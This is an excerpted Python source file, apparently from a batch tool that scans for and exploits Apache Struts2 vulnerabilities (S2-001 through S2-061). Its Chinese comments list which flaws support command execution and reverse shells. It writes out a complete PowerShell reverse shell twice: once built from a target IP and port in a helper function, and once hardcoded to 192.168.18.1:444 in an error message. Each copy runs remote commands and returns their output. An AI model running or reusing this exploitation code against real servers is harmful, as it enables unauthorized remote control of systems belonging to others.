...
def get_hash():
    time.sleep(0.05) #  不睡眠不影响结果不知道原因，可能线程原因
...
def reverse_shell_win(self, ip, port):
    cmd1 = "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port}"
    cmd2 = cmd1+");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)"
    cmd3 = cmd2 + "{{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
    cmd4 = cmd3 +"$sendback  = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
    cmd = cmd4.format(ip=ip, port=port)
...
class S2_061:
    ...
    # def get_path(self):
    #     """获取web目录"""
    #     r = requests.post(url, da, headers=headers, verify=False)
...
s2_dict = {'S2_001': S2_001, 'S2_003': S2_003, 'S2_005': S2_005, 'S2_007': S2_007, 'S2_008': S2_008, 'S2_009': S2_009,
           ...
           'S2_052': S2_052, 'S2_053': S2_053, 'S2_devMode': S2_devMode, "S2_057": S2_057, "S2_061": S2_061}
# S2-052不支持漏洞扫描和检查
s2_list = [S2_001, S2_003, S2_005, S2_007, S2_008, S2_009, S2_012, S2_013, S2_015, S2_016, S2_019,
           S2_029, S2_032, S2_033, S2_037, S2_045, S2_046, S2_048, S2_053, S2_devMode, S2_057, S2_061]
...
exec_names = ["S2_001", "S2_003", "S2_005", "S2_007", "S2_008", "S2_009", "S2_012", "S2_013", "S2_015", "S2_016",
              "S2_019",
              "S2_029", "S2_032", "S2_033", "S2_037", "S2_045", "S2_046", "S2_048", "S2_052", "S2_052","S2_053", "S2_devMode",
              "S2_057", "S2_061"]
# 支持反弹shell的漏洞名称列表
reverse_names = ["S2_001", "S2_007", "S2_008", "S2_009", "S2_013", "S2_015", "S2_016", "S2_019", "S2_029", "S2_032",
                 "S2_033", "S2_037", "S2_045", "S2_046", "S2_048", "S2_052", "S2_052", "S2_devMode", "S2_057", "S2_061"]

#  支持反弹Windows的漏洞列表
winshell_names = ["S2_001","S2_016","S2_019", "S2_032", "S2_061"]
#  没有测试反弹Windows的漏洞列表
winshell_names_not = ["S2_007", "S2_009", "S2_012", " S2_048", "S2_029", "S2_037", "S2_046", "S2_033", "S2_053", "S2_devMode", "S2_057"]
...
def main(info, version, url, file, name, data, header, encode, proxy, exec, lin_reverse, win_reverse, upfile, uppath, quiet, timeout,
         workers, webpath):
    '''Struts2批量扫描利用工具'''
    ...
    if name and url:
        ...
        if win_reverse:
            if name in winshell_names:
                ...
                click.secho("[ERROR] 没有测试改payload，可以通过命令尝试反弹(powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('192.168.18.1',444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\")".format(name=name), fg="red")
